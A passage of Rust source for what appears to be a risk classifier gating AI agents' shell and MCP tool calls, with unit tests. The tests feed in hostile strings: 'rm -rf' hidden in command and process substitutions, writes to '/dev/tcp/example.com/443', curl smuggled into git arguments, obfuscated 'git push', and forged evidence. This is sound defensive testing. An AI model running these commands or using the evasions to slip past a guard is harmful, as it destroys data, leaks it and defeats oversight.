        value.source = "native_command_evidence_incomplete";
        pipeline_from_parts(value, pipeline.semantic.clone(), false)
    };
    if evidence.to_string().len() > 128 * 1024 {
        return incomplete(deterministic);
    }
    let Ok(proof) = serde_json::from_value::<LocalCommandEvidence>(evidence.clone()) else {
        return incomplete(deterministic);
    };
    let requested_cwd = arguments
        .get("workdir")
        .or_else(|| arguments.get("cwd"))
        .and_then(|v| v.as_str());
    let age = chrono::Utc::now()
        .timestamp_millis()
        .saturating_sub(proof.collected_at_ms);
    if proof.schema != "statewright/local-command-evidence/v1"
        || proof.tool_name != tool_name
        || proof.command != command
        || proof.invocation != invocation
        || proof.requested_cwd.as_deref() != requested_cwd
        || !proof
            .cwd
            .as_deref()
            .is_some_and(|cwd| std::path::Path::new(cwd).is_absolute())
        || !(-5000..=30000).contains(&age)
        || !proof.complete
        || proof.reason.is_some()
        || proof.commands.is_empty()
        || proof.commands.len() > 32
        || proof.files.is_empty()
        || proof.files.len() > 64
        || proof.files.iter().any(|file| {
            file.path.is_empty()
                || std::path::Path::new(&file.path).is_absolute()
                || file.path.split('/').any(|p| matches!(p, "" | "." | ".."))
                || file.sha256.len() != 64
                || !file.sha256.bytes().all(|b| b.is_ascii_hexdigit())
        })
    {
        return incomplete(deterministic);
    }
    let mut classes = vec![OpClass::BoundedLocalExecution];
    for unit in &proof.commands {
        if unit.original.len() > 8192 || unit.resolved.len() > 8192 {
            return incomplete(deterministic);
        }
        let parsed_unit_invocation = bash_classifier::literal_invocation(&unit.original);
        if unit.invocation != parsed_unit_invocation
            || (unit.cwd != "."
                && (unit.cwd.is_empty()
                    || std::path::Path::new(&unit.cwd).is_absolute()
                    || unit
                        .cwd
                        .split('/')
                        .any(|part| matches!(part, "" | "." | ".."))))
        {
            return incomplete(deterministic);
        }
        if let Some(entrypoint) = parsed_unit_invocation
            .as_ref()
            .and_then(bash_classifier::bounded_node_repository_entrypoint)
        {
            if unit.original != unit.resolved {
                return incomplete(deterministic);
            }
            let bound_path = if unit.cwd == "." {
                entrypoint.to_owned()
            } else {
                format!("{}/{entrypoint}", unit.cwd)
            };
            if !proof.files.iter().any(|file| file.path == bound_path) {
                return incomplete(deterministic);
            }
            classes.push(OpClass::BoundedLocalExecution);
            continue;
        }
        if unit.original != unit.resolved {
            let Some(unit_invocation) = parsed_unit_invocation.as_ref() else {
                return incomplete(deterministic);
            };
            if unit_invocation.executable != "npx"
                || unit_invocation.args.first().map(String::as_str) != Some("vitest")
            {
                return incomplete(deterministic);
            }
            let mut expected = vec!["node_modules/.bin/vitest".to_owned()];
            expected.extend(unit_invocation.args.iter().skip(1).cloned());
            if bash_classifier::simple_command_tokens(&unit.resolved).as_ref() != Some(&expected)
                || bash_classifier::classify(&unit.resolved) != vec![OpClass::BoundedLocalExecution]
            {
                return incomplete(deterministic);
            }
        }
        let ast = shell_ast_shadow::assess(&unit.resolved);
        if ast.status != ParseStatus::Parsed {
            classes.push(OpClass::Opaque);
        }
        classes.extend(ast.classes);
    }
    // Every expanded execution unit contributes to the risk/capability union.
    // Incomplete leaves cannot erase a known write, delete or network operation.
    let known = if classes.contains(&OpClass::Destructive) {
        (RiskBand::Critical, ExposureBand::Local)
    } else if classes.contains(&OpClass::Network) || classes.contains(&OpClass::GitWrite) {
        (RiskBand::High, ExposureBand::External)
    } else if classes
        .iter()
        .any(|c| matches!(c, OpClass::Opaque | OpClass::Passthrough))
    {
        (RiskBand::Moderate, ExposureBand::Unknown)
    } else {
        (RiskBand::Moderate, ExposureBand::Local)
    };
    deterministic.risk = known.0;
    deterministic.exposure = known.1;
    deterministic.required_capability = local_effect_capability(&classes);
    deterministic.source = "native_command_evidence";
    // Unresolved expansions need more structural evidence, not a probability
    // inferred from the innocent name of their original wrapper.
    pipeline_from_parts(deterministic, pipeline.semantic, false)
}

fn semantic_failsafe_floor(
    deterministic: RiskBand,
    semantic: &SemanticAssessmentReceipt,
) -> RiskBand {
    let Some(vector) = semantic.vector.as_ref() else {
        return deterministic;
    };
    let semantic_floor = if vector.destructive.get() >= 0.85 || vector.irreversible.get() >= 0.85 {
        RiskBand::Critical
    } else if vector.external_or_account_effect.get() >= 0.85 {
        RiskBand::High
    } else if vector.may_write.get() >= 0.85 {
        RiskBand::Moderate
    } else {
        RiskBand::Low
    };
    if risk_rank(semantic_floor) > risk_rank(deterministic) {
        semantic_floor
    } else {
        deterministic
    }
}

fn risk_rank(risk: RiskBand) -> u8 {
    match risk {
        RiskBand::Low => 0,
        RiskBand::Moderate => 1,
        RiskBand::High => 2,
        RiskBand::Critical => 3,
    }
}

pub fn assess_mcp(tool: Option<&ToolInfo>, tool_name: &str) -> ShadowAssessment {
    let operation_intent = mcp_operation_intent(mcp_operation(tool_name));
    // A child agent receives a separate tool surface and can exercise authority
    // that is not bounded by the current invocation. Keep delegation distinct
    // from an opaque MCP call so provider shims can prefer inline recovery or
    // route a real model/role change through a Statewright-managed fork. A
    // one-shot approval must never grant an unbounded raw child tool surface.
    if is_agent_delegation_tool(tool_name) {
        return assessment(
            RiskBand::High,
            ExposureBand::Unknown,
            "unmanaged_agent_delegation",
        );
    }
    if let Some(tool) = tool {
        // Negative evidence takes precedence over an optimistic read hint.
        if tool.annotations.as_ref().and_then(|a| a.destructive_hint) == Some(true) {
            return assessment(RiskBand::Critical, ExposureBand::Account, "mcp_annotation");
        }
        if tool.annotations.as_ref().and_then(|a| a.read_only_hint) == Some(true)
            && !matches!(
                operation_intent,
                McpOperationIntent::Write
                    | McpOperationIntent::Destructive
                    | McpOperationIntent::ExternalWrite
            )
        {
            let exposure =
                if tool.annotations.as_ref().and_then(|a| a.open_world_hint) == Some(true) {
                    ExposureBand::External
                } else {
                    ExposureBand::Local
                };
            return assessment(RiskBand::Low, exposure, "mcp_annotation");
        }
    }
    let open_world = tool
        .and_then(|tool| tool.annotations.as_ref())
        .and_then(|annotations| annotations.open_world_hint)
        == Some(true);
    let read_denied = tool
        .and_then(|tool| tool.annotations.as_ref())
        .and_then(|hints| hints.read_only_hint)
        == Some(false);
    // Closed-world MCP hints describe a bounded domain, NOT local execution.
    // A remote database update can be closed-world and still change an account.
    let native_read = matches!(
        tool_name,
        "Grep" | "grep" | "Glob" | "glob" | "ls" | "view_image"
    );
    let result = match operation_intent {
        McpOperationIntent::Destructive | McpOperationIntent::ExternalWrite => {
            assessment(RiskBand::High, ExposureBand::Account, "mcp_name")
        }
        McpOperationIntent::Write => {
            assessment(RiskBand::Moderate, ExposureBand::Unknown, "mcp_name")
        }
        McpOperationIntent::Read if !read_denied => {
            assessment(RiskBand::Low, ExposureBand::Local, "mcp_name")
        }
        _ if native_read && !read_denied => {
            assessment(RiskBand::Low, ExposureBand::Local, "native_read")
        }
        _ => assessment(RiskBand::Moderate, ExposureBand::Unknown, "mcp_unknown"),
    };
    if open_world && result.exposure != ExposureBand::Account {
        assessment(result.risk, ExposureBand::External, result.source)
    } else {
        result
    }
}

fn assessment(risk: RiskBand, exposure: ExposureBand, source: &'static str) -> ShadowAssessment {
    ShadowAssessment {
        risk,
        exposure,
        source,
        state_intent: None,
        invocation_fingerprint: None,
        required_capability: None,
        semantic_request: None,
        ast_semantic_request: None,
    }
}

fn invocation_fingerprint(tool_name: &str, arguments: &serde_json::Value) -> String {
    // The random process namespace makes the exact invocation identity opaque
    // outside this gateway lifetime. Approval is therefore one-shot and
    // cannot survive a gateway restart without a fresh classifier decision.
    static NAMESPACE: OnceLock<uuid::Uuid> = OnceLock::new();
    let namespace = NAMESPACE.get_or_init(uuid::Uuid::new_v4);
    let bytes = serde_json::to_vec(&(tool_name, arguments)).unwrap_or_default();
    format!(
        "invocation_v1_{}",
        uuid::Uuid::new_v5(namespace, &bytes).as_simple()
    )
}

fn assessment_with_capability(
    risk: RiskBand,
    exposure: ExposureBand,
    source: &'static str,
    required_capability: &'static str,
) -> ShadowAssessment {
    ShadowAssessment {
        required_capability: Some(required_capability),
        ..assessment(risk, exposure, source)
    }
}

fn semantic_request(
    tool: Option<&ToolInfo>,
    tool_name: &str,
    arguments: &serde_json::Value,
    state_intent: Option<&str>,
    is_shell: bool,
) -> SemanticAssessmentRequest {
    const SAFE_ARGUMENT_KEYS: &[&str] = &[
        "args", "cmd", "command", "cwd", "path", "pattern", "query", "workdir",
    ];
    let mut argument_keys = arguments
        .as_object()
        .map(|object| {
            object
                .keys()
                .filter(|key| SAFE_ARGUMENT_KEYS.contains(&key.as_str()))
                .take(16)
                .cloned()
                .collect::<Vec<_>>()
        })
        .unwrap_or_default();
    argument_keys.sort();

    let shell_shape = if is_shell {
        arguments
            .get("command")
            .or_else(|| arguments.get("cmd"))
            .and_then(|value| value.as_str())
            .and_then(bash_classifier::semantic_command_shapes)
            .unwrap_or_default()
    } else {
        Vec::new()
    };
    let annotations = tool.and_then(|tool| tool.annotations.as_ref());
    SemanticAssessmentRequest {
        tool_family: if is_shell { "shell" } else { "mcp" },
        tool_name: bounded_metadata_label(tool_name),
        state_intent: state_intent.map(bounded_metadata_label),
        argument_keys,
        shell_shape,
        shell_ast_shape: None,
        read_only_hint: annotations.and_then(|value| value.read_only_hint),
        destructive_hint: annotations.and_then(|value| value.destructive_hint),
        open_world_hint: annotations.and_then(|value| value.open_world_hint),
        mcp_shape: if is_shell {
            None
        } else {
            Some(mcp_shape(tool, tool_name, arguments))
        },
    }
}

fn shell_ast_semantic_request(
    legacy: &SemanticAssessmentRequest,
    ast: &AstShadowAssessment,
    mode: ShellAstMode,
) -> SemanticAssessmentRequest {
    let mut request = legacy.clone();
    let suffix = match mode {
        ShellAstMode::Authority => "ast_authority",
        ShellAstMode::Shadow => "ast_shadow",
        ShellAstMode::Disabled => "ast_disabled",
    };
    request.tool_name = bounded_metadata_label(&format!("{}_{}", legacy.tool_name, suffix));
    request.shell_shape = ast.semantic_shapes.clone();
    request.shell_ast_shape = Some(ast.semantic_shape());
    request
}

fn bounded_metadata_label(value: &str) -> String {
    const MAX_METADATA_LABEL_BYTES: usize = 64;
    if value.len() <= MAX_METADATA_LABEL_BYTES
        && !value.is_empty()
        && value
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'_' | b'-' | b'.'))
    {
        value.to_owned()
    } else {
        "unknown".to_owned()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn shell_bands_cover_read_local_write_and_external_write() {
        assert_eq!(assess_shell("rg pattern src").risk, RiskBand::Low);
        assert_eq!(
            assess_shell("echo hi > out.txt"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
        );
        assert_eq!(
            assess_shell("cargo test >out.txt"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
        );
        assert_eq!(
            assess_shell("(rm -rf /private/victim) >receipt.txt"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
        );
        assert_eq!(
            assess_shell("/tmp/echo payload >receipt.txt"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
        );
        assert_eq!(
            assess_shell("PS1='$(printf NESTED >&2)' echo \"${PS1@P}\" >receipt.txt"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Unknown, "shell", "Write",)
        );
        for command in [
            "echo payload >/dev/tcp/example.com/443",
            "printf payload >\"/dev/udp/example.com/53\"",
        ] {
            assert_eq!(
                assess_shell(command),
                assessment_with_capability(
                    RiskBand::Moderate,
                    ExposureBand::Unknown,
                    "shell",
                    "Write",
                ),
                "{command}"
            );
        }
        assert_eq!(
            assess_shell("git push origin main"),
            assessment(RiskBand::High, ExposureBand::External, "shell")
        );
        assert_eq!(
            assess_shell("git worktree add /private/worktree main"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
        );
        assert_eq!(
            assess_shell("git worktree prune --expire now"),
            assessment(RiskBand::Critical, ExposureBand::Local, "shell")
        );
        assert_eq!(
            assess_shell("git worktree remove /private/worktree"),
            assessment(RiskBand::Critical, ExposureBand::Local, "shell")
        );
        for command in [
            "git worktree add \"$(rm -rf /private/victim)\" main",
            "git worktree add \"$(curl https://example.invalid)\" main",
            "git worktree add <(rm -rf /private/victim) main",
        ] {
            assert_eq!(
                assess_shell(command),
                assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell"),
                "{command}"
            );
        }
        for command in [
            "git worktree add \"$(rm -rf /private/victim)\" main >receipt.txt",
            "git worktree add /private/worktree main >\"$(rm -rf /private/victim)\"",
            "git p{u..u}sh origin main >receipt.txt",
            "git worktree rem{o..o}ve --force /private/worktree >receipt.txt",
            "git worktree add >(rm -rf /private/victim) main",
            "cp <(rm -rf /private/victim) output.txt",
            "echo \"$(rm -rf /private/victim)\" >output.txt",
        ] {
            assert_eq!(
                assess_shell(command),
                assessment_with_capability(
                    RiskBand::Moderate,
                    ExposureBand::Unknown,
                    "shell",
                    "Write",
                ),
                "{command}"
            );
        }
        for command in [
            "git worktree remove --force /private/worktree >receipt.txt",
            "git worktree \"remove\" --force /private/worktree >receipt.txt",
            "git worktree re\\move --force /private/worktree >receipt.txt",
            "git worktree prune --expire now >receipt.txt",
            "git clean -fd >receipt.txt",
        ] {
            assert_eq!(
                assess_shell(command),
                assessment(RiskBand::Critical, ExposureBand::Local, "shell"),
                "{command}"
            );
        }
        assert_eq!(
            assess_shell("git push origin main >receipt.txt"),
            assessment(RiskBand::High, ExposureBand::External, "shell")
        );
        assert_eq!(
            assess_shell("git \"push\" origin main >receipt.txt"),
            assessment(RiskBand::High, ExposureBand::External, "shell")
        );
        assert_eq!(
            assess_shell("git pu\\sh origin main >receipt.txt"),
            assessment(RiskBand::High, ExposureBand::External, "shell")
        );
        assert_eq!(
            assess_shell("git > receipt.txt \"push\" origin main"),
            assessment(RiskBand::High, ExposureBand::External, "shell")
        );
        assert_eq!(
            assess_shell("git rev-parse HEAD"),
            assessment(RiskBand::Low, ExposureBand::Local, "shell")
        );
        assert_eq!(
            assess_shell("git branch --all --no-color"),
            assessment(RiskBand::Low, ExposureBand::Local, "shell")
        );
        assert_eq!(
            assess_shell("git -C /Users/ben/dev/anytype-heart status --short --branch"),
            assessment(RiskBand::Low, ExposureBand::Local, "shell")
        );
        assert_eq!(
            assess_shell("git init /Users/ben/dev/panoply"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
        );
        assert_eq!(
            assess_shell("git init -b main /Users/ben/dev/panoply"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
        );
        assert_eq!(
            assess_shell(
                "git add -- docs/research/001-anytype.md docs/adr/0002-boundary.md fixtures/compatibility/cases.json"
            ),
            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
        );
        assert_eq!(
            assess_shell(
                "statewright-git-closeout --message 'docs: record compatibility boundary' -- docs/research/001-anytype.md"
            ),
            assessment_with_capability(
                RiskBand::Moderate,
                ExposureBand::Local,
                "shell",
                "GitLocalWrite"
            )
        );
        assert_eq!(
            assess_shell("statewright-git-closeout --message test -- ../secret"),
            assessment_with_capability(RiskBand::Moderate, ExposureBand::Local, "shell", "Write",)
        );
        assert_eq!(
            assess_shell("touch output.txt"),
            assessment(RiskBand::Moderate, ExposureBand::Unknown, "shell")
        );
        assert_eq!(
            assess_shell("git switch -c feature").risk,
            RiskBand::Moderate
        );
    }

    #[test]
    fn recognized_git_introspection_does_not_depend_on_system_one_confidence() {
        struct ReadAssessor;
        impl SemanticAssessor for ReadAssessor {
            fn assess(
                &self,
                _: &SemanticAssessmentRequest,
            ) -> Result<SemanticRiskVector, SemanticAssessorStatus> {
                Ok(SemanticRiskVector {
                    read_only: Probability::new(0.99).unwrap(),
                    may_write: Probability::new(0.01).unwrap(),
                    reversible: Probability::new(0.99).unwrap(),
                    destructive: Probability::new(0.01).unwrap(),
                    irreversible: Probability::new(0.01).unwrap(),
                    external_or_account_effect: Probability::new(0.01).unwrap(),
                })
            }
        }
        let enabled =
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), Some("true"), None);
        for command in ["git rev-parse HEAD", "git branch --all --no-color"] {
            let pipeline = assess_pipeline_with_config(
                None,
                "exec_command",
                &json!({"cmd":command}),
                Some("implement"),
                Some(&ReadAssessor),
                &enabled,
            );
            assert_eq!(pipeline.deterministic.risk, RiskBand::Low, "{command}");
            assert_eq!(
                pipeline.deterministic.exposure,
                ExposureBand::Local,
                "{command}"
            );
            assert_eq!(
                pipeline.resolve_effect(),
                ResolvedEffect::ReadOnly,
                "{command}"
            );
        }
    }

    #[test]
    fn mcp_prefers_registered_annotations_and_marks_unknown() {
        let reader: ToolInfo = serde_json::from_value(
            json!({"name":"opaque","inputSchema":{},"annotations":{"readOnlyHint":true}}),
        )
        .unwrap();
        assert_eq!(assess_mcp(Some(&reader), "opaque").risk, RiskBand::Low);
        assert_eq!(
            assess_mcp(None, "mcp__opaque__thing").exposure,
            ExposureBand::Unknown
        );
        assert_eq!(
            assess_mcp(None, "mcp__mail__send_email"),
            assessment(RiskBand::High, ExposureBand::Account, "mcp_name")
        );
    }

    #[test]
    fn native_command_evidence_resolves_units_without_losing_effects_or_identity() {
        set_test_shell_ast_authority_enabled(Some(true));
        let command = "task test:unit";
        let input = json!({"cmd": command, "workdir":"/workspace"});
        let base = || {
            let deterministic = assess_invocation(None, "exec_command", &input, Some("validate"));
            let request = deterministic.semantic_request.as_ref().unwrap().clone();
            pipeline_from_parts(
                deterministic,
                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
                true,
            )
        };
        let proof = |units: Vec<serde_json::Value>| {
            json!({
                "schema":"statewright/local-command-evidence/v1", "tool_name":"exec_command",
                "command":command, "requested_cwd":"/workspace", "cwd":"/workspace",
                "invocation":bash_classifier::literal_invocation(command).unwrap(),
                "collected_at_ms":chrono::Utc::now().timestamp_millis(), "complete":true,
                "files":[{"path":"Taskfile.yml","sha256":"a".repeat(64)}], "commands":units,
            })
        };
        let evidence_unit = |original: &str, resolved: &str| {
            json!({
                "original":original, "resolved":resolved, "cwd":".",
                "invocation":bash_classifier::literal_invocation(original),
            })
        };
        let unit = evidence_unit(
            "npx vitest run tests/a.spec.js",
            "node_modules/.bin/vitest run tests/a.spec.js",
        );
        assert_eq!(base().resolve_effect(), ResolvedEffect::DenyUncertain);
        let original_fingerprint = base().deterministic.invocation_fingerprint;
        let valid = proof(vec![unit.clone()]);
        let admitted =
            apply_native_command_evidence(base(), None, "exec_command", &input, Some(&valid));
        assert_eq!(
            admitted.resolve_effect(),
            ResolvedEffect::BoundedLocalExecution
        );
        assert_eq!(
            admitted.deterministic.required_capability,
            Some("BoundedLocalExecution")
        );
        assert_eq!(
            admitted.deterministic.invocation_fingerprint,
            original_fingerprint
        );
        assert!(!admitted.visible_json().to_string().contains("/workspace"));
        assert!(
            !serde_json::to_string(admitted.deterministic.semantic_request.as_ref().unwrap())
                .unwrap()
                .contains("tests/a.spec.js")
        );

        for (nested, expected) in [
            (
                "echo x > output.txt",
                ResolvedEffect::LocalWriteAndBoundedLocalExecution,
            ),
            (
                "curl https://example.invalid",
                ResolvedEffect::DenyKnownRisk,
            ),
            ("rm -rf output", ResolvedEffect::DenyKnownRisk),
            ("unknown-runner x", ResolvedEffect::DenyUncertain),
        ] {
            let p = proof(vec![unit.clone(), evidence_unit(nested, nested)]);
            assert_eq!(
                apply_native_command_evidence(base(), None, "exec_command", &input, Some(&p))
                    .resolve_effect(),
                expected,
                "{nested}"
            );
        }
        for (key, value) in [
            ("command", json!("task other")),
            ("tool_name", json!("Bash")),
            ("requested_cwd", json!("/other")),
            ("cwd", json!("relative")),
            ("collected_at_ms", json!(0)),
            ("complete", json!(false)),
            ("schema", json!("statewright/local-command-evidence/v2")),
            ("commands", json!([])),
            ("files", json!([])),
        ] {
            let mut p = valid.clone();
            p[key] = value;
            assert_eq!(
                apply_native_command_evidence(base(), None, "exec_command", &input, Some(&p))
                    .resolve_effect(),
                ResolvedEffect::DenyUncertain,
                "{key}"
            );
        }
        let forged_rewrite = proof(vec![evidence_unit(
            "curl https://example.invalid",
            "node_modules/.bin/vitest run",
        )]);
        assert_eq!(
            apply_native_command_evidence(
                base(),
                None,
                "exec_command",
                &input,
                Some(&forged_rewrite)
            )
            .resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        let registered: ToolInfo =
            serde_json::from_value(json!({"name":"exec_command","inputSchema":{}})).unwrap();
        assert_eq!(
            apply_native_command_evidence(
                base(),
                Some(&registered),
                "exec_command",
                &input,
                Some(&valid)
            )
            .resolve_effect(),
            ResolvedEffect::DenyUncertain
        );
        // Supplying a look-alike field through ordinary tool arguments cannot
        // enter the native evidence path.
        let spoofed = json!({"cmd":command,"workdir":"/workspace","command_evidence":valid});
        assert_eq!(
            assess_invocation(None, "exec_command", &spoofed, None).exposure,
            ExposureBand::Unknown
        );
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn native_package_build_evidence_admits_only_literal_vite_build() {
        set_test_shell_ast_authority_enabled(Some(true));
        let command = "npm run build";
        let input = json!({"cmd": command, "workdir":"/workspace"});
        let base = || {
            let deterministic = assess_invocation(None, "exec_command", &input, Some("validate"));
            let request = deterministic.semantic_request.as_ref().unwrap().clone();
            pipeline_from_parts(
                deterministic,
                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
                true,
            )
        };
        let proof = |resolved: &str| {
            json!({
                "schema":"statewright/local-command-evidence/v1", "tool_name":"exec_command",
                "command":command, "requested_cwd":"/workspace", "cwd":"/workspace",
                "invocation":bash_classifier::literal_invocation(command).unwrap(),
                "collected_at_ms":chrono::Utc::now().timestamp_millis(), "complete":true,
                "files":[{"path":"package.json","sha256":"a".repeat(64)}],
                "commands":[{"original":resolved,"resolved":resolved,"cwd":".",
                    "invocation":bash_classifier::literal_invocation(resolved)}],
            })
        };

        let admitted = proof("vite build");
        assert_eq!(
            apply_native_command_evidence(base(), None, "exec_command", &input, Some(&admitted))
                .resolve_effect(),
            ResolvedEffect::BoundedLocalExecution
        );
        for denied in [
            "vite build --watch",
            "vite build --config outside.js",
            "vite build --outDir ../outside",
        ] {
            let evidence = proof(denied);
            assert_eq!(
                apply_native_command_evidence(
                    base(),
                    None,
                    "exec_command",
                    &input,
                    Some(&evidence)
                )
                .resolve_effect(),
                ResolvedEffect::DenyUncertain,
                "{denied}"
            );
        }
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn native_task_directory_evidence_binds_effective_unit_cwd() {
        set_test_shell_ast_authority_enabled(Some(true));
        let command = "task -d site test:unit";
        let input = json!({"cmd":command,"workdir":"/workspace"});
        let base = || {
            let deterministic = assess_invocation(None, "exec_command", &input, Some("validate"));
            let request = deterministic.semantic_request.as_ref().unwrap().clone();
            pipeline_from_parts(
                deterministic,
                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
                true,
            )
        };
        let evidence = json!({
            "schema":"statewright/local-command-evidence/v1", "tool_name":"exec_command",
            "command":command, "requested_cwd":"/workspace", "cwd":"/workspace",
            "invocation":bash_classifier::literal_invocation(command).unwrap(),
            "collected_at_ms":chrono::Utc::now().timestamp_millis(), "complete":true,
            "files":[{"path":"site/Taskfile.yml","sha256":"a".repeat(64)}],
            "commands":[{
                "original":"node --test tests/a.test.mjs",
                "resolved":"node --test tests/a.test.mjs",
                "cwd":"site",
                "invocation":bash_classifier::literal_invocation("node --test tests/a.test.mjs"),
            }],
        });
        assert_eq!(
            apply_native_command_evidence(base(), None, "exec_command", &input, Some(&evidence))
                .resolve_effect(),
            ResolvedEffect::BoundedLocalExecution
        );
        for unit_cwd in ["../site", "/workspace/site", "site/../other"] {
            let mut invalid = evidence.clone();
            invalid["commands"][0]["cwd"] = json!(unit_cwd);
            assert_eq!(
                apply_native_command_evidence(base(), None, "exec_command", &input, Some(&invalid))
                    .resolve_effect(),
                ResolvedEffect::DenyUncertain,
                "{unit_cwd}"
            );
        }
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn native_node_entrypoint_evidence_binds_invocation_cwd_environment_and_bytes() {
        set_test_shell_ast_authority_enabled(Some(true));
        let command = "STATEWRIGHT_DIR=/workspace/statewright command -- node site/scripts/preflight.mjs preflight";
        let input = json!({"cmd":command,"workdir":"/workspace"});
        let base = || {
            let deterministic = assess_invocation(None, "exec_command", &input, Some("validate"));
            let request = deterministic.semantic_request.as_ref().unwrap().clone();
            pipeline_from_parts(
                deterministic,
                semantic_receipt(&request, SemanticAssessorStatus::Disabled),
                true,
            )
        };
        assert_eq!(base().resolve_effect(), ResolvedEffect::DenyUncertain);
        let evidence = json!({
            "schema":"statewright/local-command-evidence/v1", "tool_name":"exec_command",
            "command":command, "requested_cwd":"/workspace", "cwd":"/workspace",
            "invocation":bash_classifier::literal_invocation(command).unwrap(),
            "collected_at_ms":chrono::Utc::now().timestamp_millis(), "complete":true,
            "files":[{"path":"site/scripts/preflight.mjs","sha256":"a".repeat(64)}],
            "commands":[{"original":command,"resolved":command,"cwd":".",
                "invocation":bash_classifier::literal_invocation(command)}],
        });
        let admitted =
            apply_native_command_evidence(base(), None, "exec_command", &input, Some(&evidence));
        assert_eq!(
            admitted.resolve_effect(),
            ResolvedEffect::BoundedLocalExecution
        );
        assert_eq!(admitted.deterministic.source, "native_command_evidence");

        for mutation in ["files", "invocation", "commands"] {
            let mut invalid = evidence.clone();
            match mutation {
                "files" => {
                    invalid["files"] =
                        json!([{"path":"site/scripts/other.mjs","sha256":"a".repeat(64)}])
                }
                "invocation" => invalid["invocation"]["environment_names"] = json!([]),
                "commands" => invalid["commands"][0]["cwd"] = json!("site"),
                _ => unreachable!(),
            }
            assert_eq!(
                apply_native_command_evidence(base(), None, "exec_command", &input, Some(&invalid))
                    .resolve_effect(),
                ResolvedEffect::DenyUncertain,
                "{mutation}"
            );
        }
        set_test_shell_ast_authority_enabled(None);
    }

    #[test]
    fn agent_delegation_is_known_transitive_authority() {
        for tool_name in [
            "mcp__collaboration__spawn_agent",
            "mcp__agents__spawn_agent",
            "mcp__statewright_helpers__spawn_agent",
            "mcp__statewright_helpers__SPAWN_AGENT",
            "collaborationspawn_agent",
            "functions.collaboration.spawn_agent",
            "Agent",
        ] {
            assert_eq!(
                assess_mcp(None, tool_name),
                assessment(
                    RiskBand::High,
                    ExposureBand::Unknown,
                    "unmanaged_agent_delegation"
                )
            );
        }
        assert_eq!(
            assess_mcp(None, "statewright_run_agent").source,
            "mcp_unknown"
        );
    }

    #[test]
    fn invocation_uses_shell_text_once_and_carries_state_intent() {
        let assessment = assess_invocation(
            None,
            "Bash",
            &json!({"command": "rg policy crates"}),
            Some("exploratory_read_only"),
        );
        assert_eq!(assessment.risk, RiskBand::Low);
        assert_eq!(assessment.source, "shell");
        assert_eq!(
            assessment.state_intent.as_deref(),
            Some("exploratory_read_only")
        );
    }

    #[test]
    fn open_world_mutation_is_external_not_local() {
        let writer: ToolInfo = serde_json::from_value(json!({
            "name":"update_task", "inputSchema":{}, "annotations":{"openWorldHint":true}
        }))
        .unwrap();
        assert_eq!(
            assess_mcp(Some(&writer), "update_task"),
            assessment(RiskBand::Moderate, ExposureBand::External, "mcp_name")
        );
    }

    #[test]
    fn native_write_locality_requires_trusted_adapter_provenance() {
        let upstream_collision: ToolInfo = serde_json::from_value(json!({
            "name":"apply_patch",
            "inputSchema":{},
            "annotations":{
                "readOnlyHint":false,
                "destructiveHint":true,
                "openWorldHint":true
            }
        }))
        .unwrap();
        assert_eq!(
            assess_mcp(Some(&upstream_collision), "apply_patch"),
            assessment(RiskBand::Critical, ExposureBand::Account, "mcp_annotation")
        );

        for native in [
            "Write",
            "write",
            "Edit",
            "edit",
            "MultiEdit",
            "multiedit",
            "apply_patch",
            "functions.apply_patch",
            "StrReplace",
            "str_replace",
            "write_file",
            "edit_file",
            "patch_file",
            "create_file",
            "create_or_update_file",
        ] {
            let assessed = assess_invocation_with_origin(
                None,
                native,
                &json!({"patch":"redacted"}),
                Some("implement"),
                true,
            );
            assert_eq!(assessed.risk, RiskBand::Moderate, "{native}");
            assert_eq!(assessed.exposure, ExposureBand::Local, "{native}");
            assert_eq!(assessed.source, "native_write", "{native}");
        }

        let freeform_patch = assess_invocation_with_origin(
            None,
            "apply_patch",
            &json!({"command":"*** Begin Patch\n*** Update File: src/lib.rs\n*** End Patch"}),
            Some("implement"),
            true,
        );
        assert_eq!(freeform_patch.risk, RiskBand::Moderate);
        assert_eq!(freeform_patch.exposure, ExposureBand::Local);
        assert_eq!(freeform_patch.source, "native_write");

        let registered_collision = assess_invocation_with_origin(
            Some(&upstream_collision),
            "apply_patch",
            &json!({"patch":"redacted"}),
            Some("implement"),
            true,
        );
        assert_eq!(registered_collision.risk, RiskBand::Critical);
        assert_eq!(registered_collision.exposure, ExposureBand::Account);
        assert_ne!(registered_collision.source, "native_write");
    }

    #[tokio::test]
    async fn trusted_native_freeform_patch_pipeline_resolves_as_local_write() {
        let config =
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), Some("true"), None);
        let pipeline = assess_pipeline_visible_with_runtime(
            None,
            "apply_patch",
            &json!({"command":"*** Begin Patch\n*** Update File: src/lib.rs\n*** End Patch"}),
            Some("implement"),
            true,
            &config,
            None,
            std::time::Duration::ZERO,
        )
        .await;

        assert_eq!(pipeline.deterministic.source, "native_write");
        assert_eq!(pipeline.deterministic.risk, RiskBand::Moderate);
        assert_eq!(pipeline.deterministic.exposure, ExposureBand::Local);
        assert_eq!(pipeline.effective_risk, RiskBand::Moderate);
        assert_eq!(pipeline.resolve_effect(), ResolvedEffect::LocalWrite);
    }

    #[tokio::test]
    async fn trusted_git_closeout_pipeline_preserves_its_narrow_capability() {
        let config =
            SemanticShadowConfig::from_values(Some("staging"), Some("true"), Some("true"), None);
